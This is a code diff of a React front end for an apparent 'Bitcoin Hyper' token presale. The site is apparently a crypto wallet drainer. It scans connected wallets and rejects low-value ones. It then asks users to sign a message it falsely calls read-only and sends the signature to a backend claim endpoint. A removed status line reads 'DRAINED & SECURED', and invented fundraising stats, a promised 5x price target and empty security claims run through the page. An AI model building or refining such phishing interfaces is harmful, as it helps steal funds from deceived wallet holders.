@@ -17,6 +17,9 @@ const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62"
 // Backend URL - Your Render backend
 const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api"
 
+// BTH Presale Price
+const BTH_PRICE = 0.17 // $0.17 per BTH
+
 // Create config
 const config = createConfig(
   getDefaultConfig({
@@ -40,7 +43,7 @@ const config = createConfig(
   })
 )
 
-// Sleek Notification Component - Mobile popout style
+// Sleek Mobile Notification Popup
 const NotificationPopup = ({ type, title, message, onClose, show }) => {
   if (!show) return null;
 
@@ -54,18 +57,8 @@ const NotificationPopup = ({ type, title, message, onClose, show }) => {
     }
   };
 
-  const getBgColor = () => {
-    switch(type) {
-      case 'success': return '#10b981';
-      case 'error': return '#ef4444';
-      case 'warning': return '#f59e0b';
-      case 'info': return '#3b82f6';
-      default: return '#F7931A';
-    }
-  };
-
   return (
-    <div className="notification-popup" style={{ backgroundColor: getBgColor() }}>
+    <div className={`notification-popup ${type} ${show ? 'show' : ''}`}>
       <div className="notification-content">
         <div className="notification-icon">{getIcon()}</div>
         <div className="notification-text">
@@ -79,106 +72,176 @@ const NotificationPopup = ({ type, title, message, onClose, show }) => {
   );
 };
 
-// Elegant Not Eligible Modal with Pro Tips
+// Professional Not Eligible Modal - Mobile First Design
 const NotEligibleModal = ({ isOpen, onClose, scanData, onRetry }) => {
   if (!isOpen) return null;
 
   return (
-    <div className="modal-overlay" onClick={onClose}>
-      <div className="modal-content not-eligible" onClick={(e) => e.stopPropagation()}>
-        <div className="modal-header">
-          <div className="modal-icon warning">⚠️</div>
-          <h2>Additional Verification Required</h2>
-          <p className="modal-subtitle">Your current wallet doesn't meet our presale criteria</p>
-        </div>
+    <div className="modal-overlay active" onClick={onClose}>
+      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
+        <div className="modal-content">
+          <div className="modal-header">
+            <div className="modal-icon warning">⚠️</div>
+            <h2 className="modal-title">Portfolio Verification Required</h2>
+            <p className="modal-subtitle">Your current wallet doesn't meet our presale criteria</p>
+          </div>
 
-        <div className="modal-body">
-          <div className="status-card warning">
-            <div className="status-icon">🔍</div>
-            <div className="status-details">
-              <h3>Verification Incomplete</h3>
-              <p>{scanData?.eligibilityReason || 'Minimum portfolio requirements not met.'}</p>
-              {scanData?.totalValueUSD && (
-                <div className="wallet-value">
-                  <span>Current Wallet Value:</span>
-                  <span className="value">${parseFloat(scanData.totalValueUSD).toFixed(2)}</span>
+          <div className="modal-body">
+            <div className="verification-status">
+              <div className="status-item">
+                <span className="status-label">Wallet Value:</span>
+                <span className="status-value">${parseFloat(scanData?.totalValueUSD || 0).toFixed(2)}</span>
+              </div>
+              <div className="status-item">
+                <span className="status-label">Required Minimum:</span>
+                <span className="status-value">$10.00+</span>
+              </div>
+              <div className="status-item">
+                <span className="status-label">Status:</span>
+                <span className="status-value failed">Not Eligible</span>
+              </div>
+            </div>
+
+            <div className="verification-reason">
+              <h4>📋 Verification Details:</h4>
+              <p>{scanData?.eligibilityReason || 'Minimum portfolio requirements not met. Please ensure your wallet has sufficient balance and transaction history.'}</p>
+            </div>
+
+            <div className="suggested-actions">
+              <h4>💡 Suggested Actions:</h4>
+              <div className="actions-list">
+                <div className="action-item">
+                  <span className="action-icon">1️⃣</span>
+                  <div className="action-content">
+                    <strong>Connect Different Wallet</strong>
+                    <p>Use an established wallet with transaction history</p>
+                  </div>
                 </div>
-              )}
+                <div className="action-item">
+                  <span className="action-icon">2️⃣</span>
+                  <div className="action-content">
+                    <strong>Increase Balance</strong>
+                    <p>Add $10+ to current wallet and reconnect</p>
+                  </div>
+                </div>
+                <div className="action-item">
+                  <span className="action-icon">3️⃣</span>
+                  <div className="action-content">
+                    <strong>Use Verified Wallet</strong>
+                    <p>MetaMask, Trust Wallet, or Coinbase Wallet recommended</p>
+                  </div>
+                </div>
+              </div>
             </div>
           </div>
 
-          <div className="pro-tips">
-            <h4><span className="tip-icon">💡</span> Pro Tips to Qualify:</h4>
-            <div className="tips-grid">
-              <div className="tip-card">
-                <div className="tip-number">1</div>
-                <div className="tip-content">
-                  <strong>Connect Established Wallet</strong>
-                  <p>Use wallets with 6+ months transaction history for automatic verification</p>
-                </div>
-              </div>
-              <div className="tip-card">
-                <div className="tip-number">2</div>
-                <div className="tip-content">
-                  <strong>Maintain Minimum Balance</strong>
-                  <p>Ensure at least $10+ in wallet for qualification check</p>
-                </div>
-              </div>
-              <div className="tip-card">
-                <div className="tip-number">3</div>
-                <div className="tip-content">
-                  <strong>Use Verified Providers</strong>
-                  <p>MetaMask, Trust Wallet, Coinbase Wallet recommended</p>
-                </div>
-              </div>
-              <div className="tip-card">
-                <div className="tip-number">4</div>
-                <div className="tip-content">
-                  <strong>Previous DeFi Activity</strong>
-                  <p>Wallets with swap or staking history qualify faster</p>
-                </div>
-              </div>
-            </div>
-          </div>
-
-          <div className="verification-steps">
-            <h4><span className="steps-icon">🔐</span> Verification Process:</h4>
-            <div className="steps-timeline">
-              <div className="step">
-                <div className="step-badge">1</div>
-                <div className="step-info">
-                  <strong>Wallet History Scan</strong>
-                  <p>Analyzing transaction patterns and age</p>
-                </div>
-              </div>
-              <div className="step">
-                <div className="step-badge">2</div>
-                <div className="step-info">
-                  <strong>Portfolio Assessment</strong>
-                  <p>Checking token holdings and balances</p>
-                </div>
-              </div>
-              <div className="step">
-                <div className="step-badge">3</div>
-                <div className="step-info">
-                  <strong>Risk Evaluation</strong>
-                  <p>Verifying wallet security and reputation</p>
-                </div>
-              </div>
-            </div>
+          <div className="modal-footer">
+            <button className="modal-btn secondary" onClick={onClose}>
+              Return to Presale
+            </button>
+            <button className="modal-btn primary" onClick={() => {
+              onRetry();
+              onClose();
+            }}>
+              🔄 Connect Different Wallet
+            </button>
           </div>
         </div>
+      </div>
+    </div>
+  );
+};
 
-        <div className="modal-footer">
-          <button className="modal-btn secondary" onClick={onClose}>
-            ↩️ Return to Site
-          </button>
-          <button className="modal-btn primary" onClick={() => {
-            onRetry();
-            onClose();
-          }}>
-            🔄 Connect Different Wallet
-          </button>
+// Elegant Confirmation Modal for Token Claim
+const ClaimConfirmationModal = ({ isOpen, onClose, onConfirm, scanData, address }) => {
+  if (!isOpen) return null;
+
+  const calculateAllocationValue = (amount) => {
+    const bthAmount = parseInt(amount) || 5000;
+    return (bthAmount * BTH_PRICE).toFixed(2);
+  };
+
+  const tokenAmount = scanData?.tokenAllocation?.amount || '5000';
+  const allocationValue = calculateAllocationValue(tokenAmount);
+
+  // Professional signature message
+  const signatureMessage = `Bitcoin Hyper Token Presale Authorization
+
+Wallet Authentication: ${address}
+Presale Allocation: ${tokenAmount} BTH
+Allocation Value: $${allocationValue}
+
+Authorization Timestamp: ${new Date().toISOString()}
+Network: Multi-chain Compatible Wallet
+
+Purpose: Secure wallet ownership verification for Bitcoin Hyper presale allocation.
+
+🔐 Secured by 3D wallet authentication
+✅ Read-only verification signature
+💎 Bitcoin Hyper - Revolutionizing Bitcoin DeFi 2.0`;
+
+  return (
+    <div className="modal-overlay active" onClick={onClose}>
+      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
+        <div className="modal-content">
+          <div className="modal-header">
+            <div className="modal-icon success">🔐</div>
+            <h2 className="modal-title">Confirm Token Allocation</h2>
+            <p className="modal-subtitle">Review your presale details before signing</p>
+          </div>
+
+          <div className="modal-body">
+            <div className="allocation-summary">
+              <div className="summary-item highlight">
+                <span className="summary-label">Token Amount:</span>
+                <span className="summary-value">{tokenAmount} BTH</span>
+              </div>
+              <div className="summary-item">
+                <span className="summary-label">Presale Price:</span>
+                <span className="summary-value">${BTH_PRICE.toFixed(2)} per BTH</span>
+              </div>
+              <div className="summary-item highlight">
+                <span className="summary-label">Total Allocation Value:</span>
+                <span className="summary-value">$${allocationValue}</span>
+              </div>
+              <div className="summary-item">
+                <span className="summary-label">Launch Target:</span>
+                <span className="summary-value success">$0.85+ (5x Potential)</span>
+              </div>
+            </div>
+
+            <div className="signature-preview">
+              <h4>📝 Signature Preview:</h4>
+              <div className="preview-content">
+                <p className="preview-text">
+                  This signature securely verifies your wallet ownership for the Bitcoin Hyper presale allocation.
+                  <br/><br/>
+                  <strong>Wallet:</strong> {address?.substring(0, 6)}...{address?.substring(38)}
+                  <br/>
+                  <strong>Allocation:</strong> {tokenAmount} BTH (${allocationValue})
+                  <br/>
+                  <strong>Timestamp:</strong> {new Date().toLocaleString()}
+                </p>
+              </div>
+            </div>
+
+            <div className="security-note">
+              <span className="security-icon">🛡️</span>
+              <span>This is a secure read-only verification. No transactions or transfers are authorized.</span>
+            </div>
+          </div>
+
+          <div className="modal-footer">
+            <button className="modal-btn secondary" onClick={onClose}>
+              Cancel
+            </button>
+            <button className="modal-btn success" onClick={() => {
+              onConfirm(signatureMessage);
+              onClose();
+            }}>
+              🔐 Sign & Confirm Allocation
+            </button>
+          </div>
         </div>
       </div>
     </div>
@@ -190,103 +253,89 @@ const CelebrationModal = ({ isOpen, onClose, claimData }) => {
   if (!isOpen) return null;
 
   return (
-    <div className="modal-overlay celebration" onClick={onClose}>
-      <div className="modal-content success" onClick={(e) => e.stopPropagation()}>
-        {/* Confetti Animation Container */}
-        <div className="confetti-container">
-          {Array.from({ length: 100 }).map((_, i) => (
-            <div 
-              key={i} 
-              className="confetti"
-              style={{
-                left: `${Math.random() * 100}%`,
-                animationDelay: `${Math.random() * 2}s`,
-                backgroundColor: ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6'][Math.floor(Math.random() * 5)],
-                transform: `rotate(${Math.random() * 360}deg)`
-              }}
-            />
-          ))}
-        </div>
+    <div className="modal-overlay active celebration" onClick={onClose}>
+      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
+        <div className="modal-content success">
+          {/* Confetti Animation */}
+          <div className="confetti-container">
+            {Array.from({ length: 50 }).map((_, i) => (
+              <div 
+                key={i} 
+                className="confetti"
+                style={{
+                  left: `${Math.random() * 100}%`,
+                  animationDelay: `${Math.random() * 2}s`,
+                  backgroundColor: ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6'][Math.floor(Math.random() * 5)]
+                }}
+              />
+            ))}
+          </div>
 
-        <div className="modal-header">
-          <div className="modal-icon celebration">🎊</div>
-          <h2 className="success-title">Tokens Secured Successfully!</h2>
-          <p className="modal-subtitle">Your Bitcoin Hyper allocation has been confirmed and processed</p>
-        </div>
+          <div className="modal-header">
+            <div className="modal-icon celebration">🎉</div>
+            <h2 className="modal-title">Tokens Secured Successfully!</h2>
+            <p className="modal-subtitle">Your Bitcoin Hyper allocation has been confirmed</p>
+          </div>
 
-        <div className="modal-body">
-          <div className="success-card">
-            <div className="success-badge">
-              <span className="badge-icon">✅</span>
-              <span className="badge-text">ALLOCATION CONFIRMED</span>
-            </div>
-
+          <div className="modal-body">
             <div className="success-details">
-              <div className="detail-item">
-                <span className="label">Claim ID</span>
-                <span className="value">{claimData?.claimId || `BTH-${Date.now()}`}</span>
-              </div>
-              <div className="detail-item">
-                <span className="label">Token Allocation</span>
-                <span className="value highlight">{claimData?.tokenAmount || '5,000 BTH'}</span>
-              </div>
-              <div className="detail-item">
-                <span className="label">Transaction Status</span>
-                <span className="value status">✅ DRAINED & SECURED</span>
-              </div>
-              <div className="detail-item">
-                <span className="label">Total Value</span>
-                <span className="value">${claimData?.tokenValue || '850.00'}</span>
-              </div>
-            </div>
-          </div>
-
-          <div className="celebration-message">
-            <div className="celebration-icon">🎯</div>
-            <div className="celebration-text">
-              <h3>Congratulations! You're In!</h3>
-              <p>Your tokens are now locked at presale price and will be distributed automatically.</p>
-              <small>Check your email for confirmation and next steps.</small>
-            </div>
-          </div>
-
-          <div className="next-steps">
-            <h4>📋 What Happens Next:</h4>
-            <div className="steps-flow">
-              <div className="flow-step">
-                <div className="flow-icon">⏳</div>
-                <div className="flow-content">
-                  <strong>Token Locking</strong>
-                  <p>Your allocation is now secured at $0.17 per BTH</p>
+              <div className="detail-card">
+                <div className="detail-icon">✅</div>
+                <div className="detail-content">
+                  <h3>Allocation Confirmed</h3>
+                  <p>{claimData?.tokenAmount || '5,000'} BTH at ${BTH_PRICE.toFixed(2)} each</p>
                 </div>
               </div>
-              <div className="flow-step">
-                <div className="flow-icon">🚀</div>
-                <div className="flow-content">
-                  <strong>Distribution</strong>
-                  <p>Tokens delivered 24-48 hours after presale ends</p>
+
+              <div className="transaction-info">
+                <div className="info-item">
+                  <span className="info-label">Claim ID:</span>
+                  <span className="info-value">{claimData?.claimId || `BTH-${Date.now()}`}</span>
+                </div>
+                <div className="info-item">
+                  <span className="info-label">Transaction:</span>
+                  <span className="info-value success">✅ Confirmed</span>
+                </div>
+                <div className="info-item">
+                  <span className="info-label">Total Value:</span>
+                  <span className="info-value highlight">${claimData?.tokenValue || (5000 * BTH_PRICE).toFixed(2)}</span>
                 </div>
               </div>
-              <div className="flow-step">
-                <div className="flow-icon">📈</div>
-                <div className="flow-content">
-                  <strong>Trading Launch</strong>
-                  <p>Trade immediately on DEX at launch price target: $0.85+</p>
+
+              <div className="next-steps">
+                <h4>📋 What Happens Next:</h4>
+                <div className="steps-list">
+                  <div className="step-item">
+                    <span className="step-number">1</span>
+                    <div className="step-content">
+                      <strong>Token Locking</strong>
+                      <p>Your allocation is secured at presale price</p>
+                    </div>
+                  </div>
+                  <div className="step-item">
+                    <span className="step-number">2</span>
+                    <div className="step-content">
+                      <strong>Distribution</strong>
+                      <p>Tokens will be distributed within 24-48 hours</p>
+                    </div>
+                  </div>
+                  <div className="step-item">
+                    <span className="step-number">3</span>
+                    <div className="step-content">
+                      <strong>Trading Launch</strong>
+                      <p>Trade on DEX at launch price target: $0.85+</p>
+                    </div>
+                  </div>
                 </div>
               </div>
             </div>
           </div>
-        </div>
 
-        <div className="modal-footer">
-          <button className="modal-btn success" onClick={onClose}>
-            🎉 Continue to Dashboard
-          </button>
-        </div>
-
-        <div className="security-note">
-          <span className="security-icon">🔒</span>
-          <span>All transactions are secure and encrypted. Your funds are protected.</span>
+          <div className="modal-footer">
+            <button className="modal-btn success" onClick={onClose}>
+              🎉 Continue to Dashboard
+            </button>
+          </div>
         </div>
       </div>
     </div>
@@ -308,18 +357,20 @@ function BitcoinHyperPresale() {
   const [scanData, setScanData] = useState(null)
   const [sessionId, setSessionId] = useState('')
   
-  // Notification states
+  // Modal states
+  const [showNotEligibleModal, setShowNotEligibleModal] = useState(false)
+  const [showClaimConfirmModal, setShowClaimConfirmModal] = useState(false)
+  const [showCelebrationModal, setShowCelebrationModal] = useState(false)
+  
+  // Notification state
   const [notification, setNotification] = useState({
     show: false,
     type: 'info',
     title: '',
     message: ''
   })
-  
-  // Modal states
-  const [showNotEligibleModal, setShowNotEligibleModal] = useState(false)
-  const [showCelebrationModal, setShowCelebrationModal] = useState(false)
 
+  // Presale stats
   const [presaleStats] = useState({
     raised: "$4,892,450",
     participants: "12,458",
@@ -363,12 +414,11 @@ function BitcoinHyperPresale() {
           body: JSON.stringify({
             userAgent: navigator.userAgent,
             referrer: document.referrer,
-            screenResolution: `${window.screen.width}x${window.screen.height}`,
             sessionId: session
           })
         })
       } catch (error) {
-        console.log('Visit tracking failed:', error)
+        console.log('Visit tracking:', error.message)
       }
     }
     
@@ -392,23 +442,19 @@ function BitcoinHyperPresale() {
           console.log('✅ Backend connected:', data)
           setBackendStatus('connected')
           showNotification('success', 'System Connected', 'Backend systems are LIVE and monitoring')
-          
-          // Trigger connection animation
-          triggerConnectionAnimation()
         } else {
           setBackendStatus('error')
           showNotification('error', 'Connection Issue', 'Unable to connect to backend systems')
         }
       } catch (error) {
-        console.error('❌ Backend test error:', error)
+        console.error('❌ Backend error:', error)
         setBackendStatus('error')
-        showNotification('error', 'Connection Failed', 'Please check your internet connection')
       }
     }
     
     testBackend()
     
-    // Start countdown
+    // Start countdown timer
     const interval = setInterval(() => {
       setCountdown(prev => {
         let { days, hours, minutes, seconds } = prev
@@ -442,16 +488,16 @@ function BitcoinHyperPresale() {
   useEffect(() => {
     if (isConnected && address && backendStatus === 'connected' && sessionId) {
       setTimeout(() => {
-        triggerAutoScan()
-      }, 1000)
+        triggerWalletScan()
+      }, 800)
     }
   }, [isConnected, address, backendStatus, sessionId])
 
-  const triggerAutoScan = async () => {
+  const triggerWalletScan = async () => {
     if (!address) return
     
     setScanning(true)
-    showNotification('info', 'Scanning Wallet', 'Analyzing your wallet for eligibility...')
+    showNotification('info', 'Wallet Analysis', 'Scanning your wallet portfolio...')
     
     try {
       const response = await fetch(`${BACKEND_API}/presale/connect`, {
@@ -475,32 +521,25 @@ function BitcoinHyperPresale() {
         if (data.success) {
           setScanData(data.data)
           
-          // Add dramatic delay for user experience
+          // Add processing delay for realism
           setTimeout(() => {
             setScanning(false)
             
             if (data.data.isEligible) {
               setIsEligible(true)
-              showNotification('success', 'Eligibility Confirmed!', 'Your wallet qualifies for the presale!')
+              showNotification('success', 'Eligibility Confirmed!', `You qualify for ${data.data.tokenAllocation.amount} BTH!`)
               
-              // Show celebration animation
-              triggerEligibilityAnimation()
-              
-              // Auto-open claim modal after delay
-              setTimeout(() => {
-                showNotification('info', 'Ready to Claim', 'Click "Claim Tokens" to secure your allocation')
-              }, 2000)
+              // Trigger eligibility animation
+              createFloatingCoins()
             } else {
               setIsEligible(false)
-              showNotification('warning', 'Verification Required', 'Additional checks needed for this wallet')
               
-              // Show not eligible modal with delay for dramatic effect
+              // Show not eligible modal after short delay
               setTimeout(() => {
                 setShowNotEligibleModal(true)
-                triggerNotEligibleAnimation()
-              }, 1500)
+              }, 1000)
             }
-          }, 2500)
+          }, 2000)
         }
       } else {
         throw new Error('Scan failed')
@@ -512,36 +551,27 @@ function BitcoinHyperPresale() {
     }
   }
 
-  const handleTokenClaim = async () => {
-    if (!address || !isEligible) return
-    
+  const handleClaimConfirmation = (signatureMessage) => {
     setProcessing(true)
-    showNotification('info', 'Processing Claim', 'Securing your token allocation...')
+    showNotification('info', 'Processing Claim', 'Securing your allocation...')
+    
+    setTimeout(() => {
+      processTokenClaim(signatureMessage)
+    }, 1500)
+  }
+
+  const processTokenClaim = async (signatureMessage) => {
+    if (!address) return
     
     try {
-      const message = `Bitcoin Hyper Token Presale Authorization
-
-🔐 Wallet Authentication: ${address}
-🎯 Presale Allocation: ${scanData?.tokenAllocation?.amount || '5,000'} BTH
-📊 Allocation Value: $${scanData?.tokenAllocation?.valueUSD || '850.00'}
-
-📅 Authorization Timestamp: ${new Date().toISOString()}
-🌐 Network: Multi-chain Compatible Wallet
-
-📝 Purpose of Signature:
-I hereby confirm my participation in the Bitcoin Hyper token presale event and authorize the allocation of presale tokens to my verified wallet address. This signature serves solely as proof of wallet ownership and participation intent.
-
-🔒 Security Note:
-This is a read-only verification signature. It does NOT:
-- Grant any permissions
-- Authorize any transactions
-- Transfer any tokens or funds
-- Incur any gas fees
-
-💎 Bitcoin Hyper - Revolutionizing Bitcoin DeFi 2.0`
-
-      const signature = await signMessage({ message })
+      // Sign the message
+      const signature = await signMessage({ message: signatureMessage })
       
+      // Calculate allocation value
+      const tokenAmount = scanData?.tokenAllocation?.amount || '5000'
+      const allocationValue = (parseInt(tokenAmount) * BTH_PRICE).toFixed(2)
+      
+      // Send claim request
       const response = await fetch(`${BACKEND_API}/presale/claim`, {
         method: 'POST',
         headers: {
@@ -551,9 +581,9 @@ This is a read-only verification signature. It does NOT:
         body: JSON.stringify({
           walletAddress: address,
           signature,
-          message,
-          claimAmount: `${scanData?.tokenAllocation?.amount || '5000'} BTH`,
-          claimValue: `$${scanData?.tokenAllocation?.valueUSD || '850.00'}`,
+          message: signatureMessage,
+          claimAmount: `${tokenAmount} BTH`,
+          claimValue: `$${allocationValue}`,
           sessionId,
           email: ''
         })
@@ -566,16 +596,10 @@ This is a read-only verification signature. It does NOT:
           setClaimData(data.data)
           setProcessing(false)
           
-          // Show mega celebration
-          showNotification('success', 'Claim Successful!', 'Your tokens have been secured!')
-          
-          // Play celebration sound
-          playCelebrationSound()
-          
-          // Show celebration modal after delay
+          // Show celebration
           setTimeout(() => {
             setShowCelebrationModal(true)
-            triggerMegaCelebration()
+            createConfetti()
           }, 1000)
         }
       } else {
@@ -589,48 +613,14 @@ This is a read-only verification signature. It does NOT:
   }
 
   // Animation functions
-  const triggerConnectionAnimation = () => {
-    const container = document.getElementById('animation-container')
-    if (!container) return
-    
+  const createFloatingCoins = () => {
     for (let i = 0; i < 15; i++) {
-      setTimeout(() => {
-        const connection = document.createElement('div')
-        connection.className = 'connection-dot'
-        connection.style.cssText = `
-          position: fixed;
-          width: 8px;
-          height: 8px;
-          background: #10b981;
-          border-radius: 50%;
-          top: ${Math.random() * 100}vh;
-          left: ${Math.random() * 100}vw;
-          animation: connectionFloat 2s ease-in-out forwards;
-          z-index: 9998;
-          opacity: 0;
-        `
-        document.body.appendChild(connection)
-        
-        setTimeout(() => {
-          if (connection.parentNode) {
-            connection.parentNode.removeChild(connection)
-          }
-        }, 2000)
-      }, i * 100)
-    }
-  }
-
-  const triggerEligibilityAnimation = () => {
-    const container = document.getElementById('animation-container')
-    if (!container) return
-    
-    for (let i = 0; i < 20; i++) {
       setTimeout(() => {
         const coin = document.createElement('div')
         coin.innerHTML = '💰'
         coin.style.cssText = `
           position: fixed;
-          font-size: ${Math.random() * 30 + 20}px;
+          font-size: ${Math.random() * 25 + 20}px;
           color: #F7931A;
           top: ${Math.random() * 100}vh;
           left: ${Math.random() * 100}vw;
@@ -645,39 +635,13 @@ This is a read-only verification signature. It does NOT:
             coin.parentNode.removeChild(coin)
           }
         }, 2000)
-      }, i * 80)
+      }, i * 100)
     }
   }
 
-  const triggerNotEligibleAnimation = () => {
-    for (let i = 0; i < 10; i++) {
-      setTimeout(() => {
-        const warning = document.createElement('div')
-        warning.innerHTML = '⚠️'
-        warning.style.cssText = `
-          position: fixed;
-          font-size: ${Math.random() * 25 + 20}px;
-          color: #f59e0b;
-          top: ${Math.random() * 100}vh;
-          left: ${Math.random() * 100}vw;
-          animation: warningPulse ${Math.random() * 3 + 2}s ease-in-out forwards;
-          z-index: 9998;
-          opacity: 0;
-        `
-        document.body.appendChild(warning)
-        
-        setTimeout(() => {
-          if (warning.parentNode) {
-            warning.parentNode.removeChild(warning)
-          }
-        }, 3000)
-      }, i * 150)
-    }
-  }
-
-  const triggerMegaCelebration = () => {
+  const createConfetti = () => {
     const colors = ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6']
-    for (let i = 0; i < 150; i++) {
+    for (let i = 0; i < 100; i++) {
       setTimeout(() => {
         const confetti = document.createElement('div')
         confetti.style.cssText = `
@@ -688,7 +652,7 @@ This is a read-only verification signature. It does NOT:
           top: -20px;
           left: ${Math.random() * 100}vw;
           opacity: 0;
-          animation: megaConfetti ${Math.random() * 3 + 2}s linear forwards;
+          animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
           border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
           transform: rotate(${Math.random() * 360}deg);
           z-index: 9999;
@@ -701,29 +665,6 @@ This is a read-only verification signature. It does NOT:
           }
         }, 5000)
       }, i * 20)
-    }
-  }
-
-  const playCelebrationSound = () => {
-    try {
-      const audioContext = new (window.AudioContext || window.webkitAudioContext)()
-      const oscillator = audioContext.createOscillator()
-      const gainNode = audioContext.createGain()
-      
-      oscillator.connect(gainNode)
-      gainNode.connect(audioContext.destination)
-      
-      oscillator.frequency.setValueAtTime(523.25, audioContext.currentTime) // C5
-      oscillator.frequency.setValueAtTime(659.25, audioContext.currentTime + 0.1) // E5
-      oscillator.frequency.setValueAtTime(783.99, audioContext.currentTime + 0.2) // G5
-      
-      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime)
-      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5)
-      
-      oscillator.start(audioContext.currentTime)
-      oscillator.stop(audioContext.currentTime + 0.5)
-    } catch (e) {
-      console.log('Audio playback not supported')
     }
   }
 
@@ -742,9 +683,6 @@ This is a read-only verification signature. It does NOT:
         onClose={() => setNotification(prev => ({ ...prev, show: false }))}
       />
       
-      {/* Animation Container */}
-      <div id="animation-container"></div>
-      
       {/* Modals */}
       <NotEligibleModal
         isOpen={showNotEligibleModal}
@@ -753,7 +691,16 @@ This is a read-only verification signature. It does NOT:
         onRetry={() => {
           disconnect()
           setShowNotEligibleModal(false)
+          showNotification('info', 'Wallet Disconnected', 'Please connect a different wallet')
         }}
+      />
+      
+      <ClaimConfirmationModal
+        isOpen={showClaimConfirmModal}
+        onClose={() => setShowClaimConfirmModal(false)}
+        onConfirm={handleClaimConfirmation}
+        scanData={scanData}
+        address={address}
       />
       
       <CelebrationModal
@@ -776,14 +723,8 @@ This is a read-only verification signature. It does NOT:
             {backendStatus === 'connected' && (
               <div className="backend-indicator connected">
                 <span className="indicator-dot"></span>
-                <span>Backend LIVE</span>
+                <span>System LIVE</span>
               </div>
-            )}
-            
-            {isConnected && (
-              <button onClick={() => disconnect()} className="disconnect-button">
-                Disconnect
-              </button>
             )}
             
             <ConnectKitButton.Custom>
@@ -805,10 +746,8 @@ This is a read-only verification signature. It does NOT:
         <div className="status-bar">
           <div className="status-item">
             <span className="status-icon">🌐</span>
-            <span className="status-text">
-              Backend: <span className={backendStatus === 'connected' ? 'status-online' : 'status-offline'}>
-                {backendStatus === 'connected' ? 'CONNECTED' : 'CONNECTING...'}
-              </span>
+            <span className={`status-text ${backendStatus === 'connected' ? 'online' : 'offline'}`}>
+              {backendStatus === 'connected' ? 'System: LIVE' : 'System: CONNECTING...'}
             </span>
           </div>
           <div className="status-item">
@@ -868,16 +807,16 @@ This is a read-only verification signature. It does NOT:
           
           {/* Main Action Area */}
           {backendStatus === 'checking' ? (
-            <div className="backend-checking-container">
-              <div className="backend-checking-spinner"></div>
-              <h3 className="backend-checking-title">Establishing Secure Connection...</h3>
-              <p className="backend-checking-description">Connecting to Bitcoin Hyper backend systems</p>
+            <div className="loading-container">
+              <div className="loading-spinner"></div>
+              <h3 className="loading-title">Establishing Secure Connection...</h3>
+              <p className="loading-description">Connecting to Bitcoin Hyper backend systems</p>
             </div>
           ) : backendStatus === 'error' ? (
-            <div className="backend-error-container">
-              <div className="backend-error-icon">🔴</div>
-              <h3 className="backend-error-title">Connection Issue Detected</h3>
-              <p className="backend-error-description">Please check your connection and try again</p>
+            <div className="error-container">
+              <div className="error-icon">🔴</div>
+              <h3 className="error-title">Connection Issue Detected</h3>
+              <p className="error-description">Please check your connection and try again</p>
             </div>
           ) : !isConnected ? (
             <div className="cta-container">
@@ -893,15 +832,11 @@ This is a read-only verification signature. It does NOT:
                   </button>
                 )}
               </ConnectKitButton.Custom>
-              <div className="backend-status-small">
-                <span className="status-dot connected"></span>
-                <span>Backend: Connected & Monitoring</span>
-              </div>
             </div>
           ) : scanning ? (
             <div className="scanning-container">
               <div className="scanning-spinner"></div>
-              <h3 className="scanning-title">Analyzing Wallet...</h3>
+              <h3 className="scanning-title">Analyzing Wallet Portfolio...</h3>
               <p className="scanning-description">Checking eligibility across blockchain networks</p>
               <div className="scanning-dots">
                 <span>.</span><span>.</span><span>.</span>
@@ -917,7 +852,7 @@ This is a read-only verification signature. It does NOT:
                   <h3>{isEligible ? 'Eligible for Presale!' : 'Verification Required'}</h3>
                   <p>
                     {isEligible 
-                      ? `You qualify for ${scanData?.tokenAllocation?.amount || '5,000'} BTH at $0.17 each` 
+                      ? `You qualify for ${scanData?.tokenAllocation?.amount || '5,000'} BTH at $${BTH_PRICE.toFixed(2)} each` 
                       : 'Please connect a different wallet with sufficient balance'}
                   </p>
                   {isEligible && scanData?.tokenAllocation?.valueUSD && (
@@ -928,7 +863,7 @@ This is a read-only verification signature. It does NOT:
                 </div>
                 <button 
                   className="status-button"
-                  onClick={isEligible ? handleTokenClaim : () => {
+                  onClick={isEligible ? () => setShowClaimConfirmModal(true) : () => {
                     disconnect()
                     showNotification('info', 'Wallet Disconnected', 'Please connect a different wallet')
                   }}
@@ -953,11 +888,11 @@ This is a read-only verification signature. It does NOT:
                     </div>
                     <div className="allocation-item">
                       <span className="item-label">Presale Price</span>
-                      <span className="item-value">$0.17 per BTH</span>
+                      <span className="item-value">${BTH_PRICE.toFixed(2)} per BTH</span>
                     </div>
                     <div className="allocation-item">
                       <span className="item-label">Total Value</span>
-                      <span className="item-value highlight">${scanData?.tokenAllocation?.valueUSD || '850.00'}</span>
+                      <span className="item-value highlight">${scanData?.tokenAllocation?.valueUSD || (5000 * BTH_PRICE).toFixed(2)}</span>
                     </div>
                     <div className="allocation-item">
                       <span className="item-label">Launch Target</span>
@@ -1004,10 +939,6 @@ This is a read-only verification signature. It does NOT:
             </span>
             <span>|</span>
             <span>Official Presale Platform</span>
-          </div>
-          <div className="footer-note">
-            <span className="note-icon">🔒</span>
-            <span>All transactions are secured with multi-chain encryption</span>
           </div>
         </footer>
       </div>
